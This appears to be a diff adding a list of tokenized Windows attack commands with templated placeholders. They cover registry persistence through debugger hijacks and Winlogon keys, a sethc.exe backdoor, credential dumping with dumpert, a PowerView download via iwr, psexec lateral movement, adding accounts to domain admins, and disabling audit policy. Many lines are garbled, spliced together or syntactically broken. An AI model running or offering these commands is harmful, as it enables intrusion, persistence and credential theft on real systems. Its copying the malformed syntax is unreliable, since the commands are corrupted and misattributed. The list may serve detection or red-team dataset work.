@@ -1,0 +1,64 @@
+reg add `` hkey_local_machine\system\currentcontrolset\services\ntds '' /v reportingmode -value `` `` atomictest.dll '' -value `` $ { binary_file_path } ''
+cmdkey.exe /list
+nmap c : \windows\system32\sethc.exe c : \windows\system32\sethc_backup.exe
+copy-item $ { task_name } '' $ { url } -h `` host : fuzz. $ { binary_file_path } '' /f
+domain user
+wlrmdr.exe -s $ { malicious_binary stordiag.exe }
+reg add hkcu\environment /v commandline /d $ { binary_file_path } ''
+ipconfig
+reg add `` hklm\software\microsoft\windows nt\currentversion\silentprocessexit\svchost.exe '' /v userinit /d 1 /f
+`` hkcu\software\microsoft\windows ) c : reg_dword \windows\system32\sethc.exe
+stordiag.exe
+runexehelper.exe $ { new_time }
+7z a `` $ { domain }
+psexec.exe \\ $ { range_start } , $ { i domain }
+python main.py $ { dll_file } ''
+namp -sn $ { username } password= $ { ip } / $ { command }
+powershell -executionpolicy bypass -command `` '' '' select * from __instancemodificationevent /output
+open $ { seconds } -o { output_filename }
+reg add `` hklm\system\currentcontrolset\services\winsock2\parameters '' /v `` '' /v '' /d `` $ { command } ''
+% iwr 'https : -accepteula `` new-object write-host `` hklm : //raw.githubusercontent.com/powershellmafia/powersploit/master/recon/powerview.ps1 ' -usebasicparsing ) ; get-domainuser = 'image ' )
+psexec \\ { ip_address } , $ { dump_file } ''
+esentutl.exe /y $ { bits_job_name } ''
+python -c `` s3cur3th1ssh1t_repo='https : $ _ '' )
+runexehelper.exe $ { command }
+reg add `` hklm\software\microsoft\windows nt\currentversion\silentprocessexit\svchost.exe '' /v debugger /d $ { dll_file_path }
+rdrleakdiag.exe /p $ { ip } rdp : '' /add $ { args } ''
+reg add hklm\software\microsoft\windows\currentversion\runonceex\0001\depend `` system /a
+reg add `` hklm\software\microsoft\windows nt\currentversion\image file execution options\osk.exe '' /v /v ( { binary_file_path } '' /f
+systeminfo
+reg.exe add `` hklm\system\currentcontrolset\services\ `` $ filter ; /active : \windows\system32\ $ { $ { username } /o $ { password } '' /add /add
+.\outflank-dumpert.exe dump
+reg add `` hkey_local_machine\software\microsoft\windows nt\currentversion\winlogon /v `` driver '' /d imagepath /d `` $ { dll_path } '' /f
+icacls c : \windows\system32\sethc.exe /a
+open $ { input_folder_name } $ { source } -l $ { command } $ { binary }
+get-service -name hkcu\software\classes\ms-settings\shell\open\command
+net group `` domain controllers '' /domain
+reg add `` hkcu\software\microsoft\windows nt\currentversion\winlogon\notify\atomicredteam '' /t reg_dword /v `` 1 '' /d `` 1 /f
+vssadmin /z
+get-keystrokes
+reg add `` ( `` hklm\software\microsoft\windows nt\currentversion\silentprocessexit\svchost.exe '' /v logon /v `` appinit_dlls '' /f
+reg add `` hkey_local_machine\system\currentcontrolset\control\lsa '' /v asynchronous /d `` 1 /t reg_sz /f
+silentrunner.exe $ { command }
+copy c : \windows\system32 '' '' ;
+rdrleakdiag.exe /p $ { { binary } , $ { binary } $ { binary } you { encoded binary_path }
+echo ! $ { username } password= $ { wordlist } -u -u $ { url } password= $ { password }
+wscript $ { ip } ''
+localbrute `` $ `` hklm\software\microsoft\windows nt\currentversion\image file execution options\mshta.exe '' /v debugger /d $ { dll_file_path }
+reg add hkcu\environment /v commandline /d $ { drive }
+fltmc.exe unload $ { service_name }
+auditpol /set /category '' '' '' ) logon/logoff
+pktmon.exe start -- etw
+net user $ { ip } ''
+net user $ { ip } ''
+vsiisexelauncher.exe -p $ { password } in $ { binary } in $ { binary }
+hashcat.exe -a 1 -l % windir % $ { select-object name ( ( username } /sc ping $ { command } ''
+net localgroup administrators $ { user_name } $ { password } /add
+net group `` domain admins '' $ { user_name } $ { password } /sc onlogon /fullmemdmp automatic }
+ffuf -w $ { malicious_binary } /fuzz
+.\outflank-dumpert.exe dump
+`` $ s3cur3th1ssh1t_repo='https : //raw.githubusercontent.com/s3cur3th1ssh1t
+gobuster dir -u $ { domain } $ { password_list_file_name }
+namp query !
+bitsadmin.exe /complete $ { @ { target /o $ { url } /launch : $ { binary } /add
+reg add `` hklm\software\microsoft\windows nt\currentversion\image file execution options\mshta.exe '' -name `` autorun '' /t reg_sz /d `` $ { dll_file_path } '' /f
